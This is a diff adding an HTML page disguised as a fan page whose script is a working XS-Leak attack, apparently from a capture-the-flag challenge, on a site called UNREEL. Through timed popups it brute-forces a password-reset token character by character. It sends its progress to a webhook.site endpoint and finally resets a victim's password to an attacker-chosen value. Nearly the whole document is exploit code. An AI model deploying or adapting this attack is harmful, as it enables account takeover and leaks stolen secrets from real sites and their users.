@@ -1,0 +1,139 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>just a reel fan page</title>
+</head>
+<body>
+<script>
+'use strict';
+// ---- XS-Leak oracle attack on UNREEL (popup edition v8: candidate subsets) ----
+// v7 achieved 2 chars/visit in-page, but the shepherd's pipelined submits
+// double-tested chars (queue lag -> stale p). v8 adds ?s=<candidates> so a
+// round-fail visit's exclusion info is reused: next visit tests only the
+// still-open candidates (fewer popups -> faster verdicts -> maybe 3 rounds).
+// Budget math: admin session pool ~16 logins, one per visit. 31 chars need
+// ~16 visits at 2/visit; round-fail recovery visits yield 2-3 chars thanks
+// to small candidate sets, absorbing the loss.
+//   422 (prefix correct, incomplete) -> page stays    -> popup stays open
+//   403 (wrong)  -> finish() -> +2000ms -> window.close()
+
+const NEWPASS = 'unreel-pwned-2026';
+const HEX = '0123456789abcdef';
+const FULL15 = '0123456789abcde';   // default set; 'f' decided by elimination
+const ROUND_WAIT_MAX = 4000;
+const VERDICT_BY = 9550;            // round must be judged by this absolute ms
+const ROUND_OVERHEAD = 700;
+
+const params = new URLSearchParams(location.search);
+const TARGET = (() => {
+  const t = params.get('t') || '';
+  return /^https:\/\/[a-z0-9.-]+$/i.test(t) ? t.replace(/\/+$/, '') : '';
+})();
+const REPORT = (() => {
+  const r = params.get('r') || '';
+  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(r)
+    ? 'https://webhook.site/' + r : '';
+})();
+let prefix = (params.get('p') || '').replace(/[^0-9a-f]/g, '').slice(0, 31);
+// candidate set for the FIRST round only; later rounds use the full set.
+// ?s=147a -> test only 1,4,7,a (explicit set, no elimination shortcut).
+let firstSet = (params.get('s') || '').replace(/[^0-9a-f]/g, '');
+if (firstSet.length < 2) firstSet = '';
+
+function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+
+function payload(data) {
+  return JSON.stringify({ t: new Date().toISOString(), ...data });
+}
+async function report(data) {
+  if (!REPORT) return;
+  try {
+    await fetch(REPORT, { method: 'POST', mode: 'no-cors', body: payload(data) });
+  } catch (e) { /* best effort */ }
+}
+function reportAsync(data) { report(data); }
+function beacon(data) {
+  if (!REPORT) return;
+  try {
+    navigator.sendBeacon(REPORT, new Blob([payload(data)], { type: 'text/plain' }));
+  } catch (e) { /* best effort */ }
+}
+
+function popupUrl(ch) {
+  return `${TARGET}/password/?token=${prefix}${ch}&password=${encodeURIComponent(NEWPASS)}`;
+}
+
+// Open one popup per candidate, wait until all-but-one (or all) are closed
+// or the wait runs out, close survivors, return per-candidate closed flags.
+async function round(cand, waitMs) {
+  const pops = [];
+  for (let i = 0; i < cand.length; i++) {
+    let w = null;
+    try { w = window.open(popupUrl(cand[i]), '_blank'); } catch (e) { /* keep null */ }
+    pops[i] = w;
+    if (i > 0 && i < cand.length - 1) await sleep(40);
+  }
+  const deadline = Date.now() + waitMs;
+  const need = cand.length - 1;
+  for (;;) {
+    let closed = 0;
+    for (const w of pops) { if (!w || w.closed) closed++; }
+    if (closed >= need) break;
+    if (Date.now() > deadline) break;
+    await sleep(60);
+  }
+  await sleep(80);
+  const states = pops.map((w) => !w || w.closed);
+  pops.forEach((w) => { try { if (w && !w.closed) w.close(); } catch (e) {} });
+  return states;
+}
+
+// Returns the winning char, or null on a failed verdict.
+function decide(cand, states) {
+  const open = states.map((v, i) => [v, i]).filter(([v]) => !v);
+  if (open.length === 1) return cand[open[0][1]];
+  if (open.length === 0 && cand === FULL15) return 'f'; // elimination shortcut
+  return null;
+}
+
+(async () => {
+  if (!TARGET || !REPORT) return;
+  await report({ event: 'start', prefix, target: TARGET });
+  const T0 = Date.now();
+  let useSet = firstSet;
+
+  while (prefix.length < 31) {
+    const elapsed = Date.now() - T0;
+    const wait = Math.min(ROUND_WAIT_MAX, VERDICT_BY - elapsed - ROUND_OVERHEAD);
+    if (wait < 1500) break;
+    const cand = useSet || FULL15;
+    const states = await round(cand, wait);
+    const c = decide(cand, states);
+    if (c === null) {
+      // verdict failed: still-open candidates survive or lagged; report them
+      // so the shepherd can submit a subset round next visit
+      const openCands = cand.split('').filter((_, i) => !states[i]).join('');
+      reportAsync({ event: 'round-fail', prefix, open: openCands });
+      break;
+    }
+    prefix += c;
+    useSet = ''; // later rounds use the full default set
+    reportAsync({ event: 'progress', prefix });
+  }
+
+  if (prefix.length === 31) {
+    // Final round: fire all 16; the full-token POST changes the password.
+    for (let i = 0; i < HEX.length; i++) {
+      try { window.open(popupUrl(HEX[i]), '_blank'); } catch (e) { /* ignore */ }
+      if (i > 0 && i < HEX.length - 1) await sleep(40);
+    }
+    await sleep(1200);
+    beacon({ event: 'FINAL', password: NEWPASS });
+    return;
+  }
+  beacon({ event: 'visit-done', prefix });
+})();
+</script>
+</body>
+</html>
